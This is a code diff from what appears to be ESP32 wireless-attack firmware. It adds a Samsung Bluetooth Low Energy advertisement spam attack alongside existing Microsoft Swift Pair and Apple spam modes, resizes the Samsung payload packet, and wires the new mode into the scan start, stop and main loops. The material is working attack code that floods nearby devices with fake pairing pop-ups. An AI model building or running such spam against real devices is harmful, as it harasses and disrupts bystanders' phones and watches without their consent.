@@ -80,11 +80,11 @@ extern "C" {
       }
       case Samsung: {
 
-        AdvData_Raw = new uint8_t[14];
+        AdvData_Raw = new uint8_t[15];
 
         uint8_t model = watch_models[rand() % 25].value;
         
-        AdvData_Raw[i++] = 14; // Size
+        AdvData_Raw[i++] = 15; // Size
         AdvData_Raw[i++] = 0xFF; // AD Type (Manufacturer Specific)
         AdvData_Raw[i++] = 0x75; // Company ID (Samsung Electronics Co. Ltd.)
         AdvData_Raw[i++] = 0x00; // ...
@@ -100,7 +100,7 @@ extern "C" {
         AdvData_Raw[i++] = 0x43;
         AdvData_Raw[i++] = (model >> 0x00) & 0xFF; // Watch Model / Color (?)
 
-        AdvData.addData(std::string((char *)AdvData_Raw, 14));
+        AdvData.addData(std::string((char *)AdvData_Raw, 15));
         break;
       }
       case Google: {
@@ -120,7 +120,7 @@ extern "C" {
   //// Spooky
 
   // Apple
-  NimBLEAdvertisementData getOAdvertisementData() {
+  /*NimBLEAdvertisementData getOAdvertisementData() {
     NimBLEAdvertisementData randomAdvertisementData = NimBLEAdvertisementData();
     uint8_t packet[17];
     uint8_t size = 17;
@@ -144,10 +144,10 @@ extern "C" {
 
     randomAdvertisementData.addData(std::string((char *)packet, 17));
     return randomAdvertisementData;
-  }
+  }*/
 
   // Microsoft
-  NimBLEAdvertisementData getSwiftAdvertisementData() {
+  /*NimBLEAdvertisementData getSwiftAdvertisementData() {
     extern WiFiScan wifi_scan_obj;
     NimBLEAdvertisementData randomAdvertisementData = NimBLEAdvertisementData();
     const char* display_name = wifi_scan_obj.generateRandomName();
@@ -176,7 +176,7 @@ extern "C" {
     free((void*)display_name);
 
     return randomAdvertisementData;
-  }
+  }*/
 
   class bluetoothScanAllCallback: public BLEAdvertisedDeviceCallbacks {
   
@@ -607,7 +607,8 @@ void WiFiScan::StartScan(uint8_t scan_mode, uint16_t color)
     #endif
   }
   else if ((scan_mode == BT_ATTACK_SWIFTPAIR_SPAM) || 
-           (scan_mode == BT_ATTACK_SPAM_ALL)) {
+           (scan_mode == BT_ATTACK_SPAM_ALL) ||
+           (scan_mode == BT_ATTACK_SAMSUNG_SPAM)) {
     #ifdef HAS_BT
       RunSwiftpairSpam(scan_mode, color);
     #endif
@@ -786,6 +787,7 @@ void WiFiScan::StopScan(uint8_t scan_mode)
   (currentScanMode == BT_ATTACK_SOUR_APPLE) ||
   (currentScanMode == BT_ATTACK_SWIFTPAIR_SPAM) ||
   (currentScanMode == BT_ATTACK_SPAM_ALL) ||
+  (currentScanMode == BT_ATTACK_SAMSUNG_SPAM) ||
   (currentScanMode == BT_SCAN_WAR_DRIVE) ||
   (currentScanMode == BT_SCAN_WAR_DRIVE_CONT) ||
   (currentScanMode == BT_SCAN_SKIMMERS))
@@ -1619,7 +1621,7 @@ void WiFiScan::generateRandomMac(uint8_t* mac) {
   }
 }
 
-void WiFiScan::executeSwiftpairSpam() {
+void WiFiScan::executeSwiftpairSpam(EBLEPayloadType type) {
   #ifdef HAS_BT
     uint8_t macAddr[6];
     generateRandomMac(macAddr);
@@ -1633,7 +1635,7 @@ void WiFiScan::executeSwiftpairSpam() {
     pAdvertising = pServer->getAdvertising();
 
     //NimBLEAdvertisementData advertisementData = getSwiftAdvertisementData();
-    NimBLEAdvertisementData advertisementData = this->GetUniversalAdvertisementData(Microsoft);
+    NimBLEAdvertisementData advertisementData = this->GetUniversalAdvertisementData(type);
     pAdvertising->setAdvertisementData(advertisementData);
     pAdvertising->start();
     delay(10);
@@ -2045,6 +2047,8 @@ void WiFiScan::RunSwiftpairSpam(uint8_t scan_mode, uint16_t color) {
           display_obj.tft.drawCentreString("Swiftpair Spam",120,16,2);
         else if (scan_mode == BT_ATTACK_SPAM_ALL)
           display_obj.tft.drawCentreString("BLE Spam All",120,16,2);
+        else if (scan_mode == BT_ATTACK_SAMSUNG_SPAM)
+          display_obj.tft.drawCentreString("BLE Spam Samsung",120,16,2);
         display_obj.touchToExit();
       #endif
       display_obj.tft.setTextColor(TFT_GREEN, TFT_BLACK);
@@ -4392,7 +4396,8 @@ void WiFiScan::main(uint32_t currentTime)
   }
   else if ((currentScanMode == BT_ATTACK_SWIFTPAIR_SPAM) ||
            (currentScanMode == BT_ATTACK_SOUR_APPLE) ||
-           (currentScanMode == BT_ATTACK_SPAM_ALL)) {
+           (currentScanMode == BT_ATTACK_SPAM_ALL) ||
+           (currentScanMode == BT_ATTACK_SAMSUNG_SPAM)) {
     #ifdef HAS_BT
       if (currentTime - initTime >= 1000) {
         initTime = millis();
@@ -4408,9 +4413,13 @@ void WiFiScan::main(uint32_t currentTime)
         #endif
       }
 
+      if ((currentScanMode == BT_ATTACK_SAMSUNG_SPAM) ||
+          (currentScanMode == BT_ATTACK_SPAM_ALL))
+        this->executeSwiftpairSpam(Samsung);
+
       if ((currentScanMode == BT_ATTACK_SWIFTPAIR_SPAM) ||
           (currentScanMode == BT_ATTACK_SPAM_ALL))
-        this->executeSwiftpairSpam();
+        this->executeSwiftpairSpam(Microsoft);
 
       if ((currentScanMode == BT_ATTACK_SOUR_APPLE) ||
           (currentScanMode == BT_ATTACK_SPAM_ALL))
